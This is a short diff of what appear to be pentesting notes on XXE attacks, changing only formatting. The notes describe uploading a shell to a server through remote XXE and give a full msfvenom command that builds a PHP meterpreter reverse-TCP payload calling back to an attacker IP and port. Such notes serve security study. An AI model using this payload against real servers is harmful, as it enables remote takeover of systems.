@@ -99,10 +99,8 @@ we can also try different payloads
 
 WE can also use the above command and replace file with expect command
 
-    Remote xxe
-
+Remote xxe
 we can use this to upload a shell to server
-
 instead of .php shell we should make .txt shell with msfvenom because these attacks sometimes run the php shell on our machine
 
     msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt
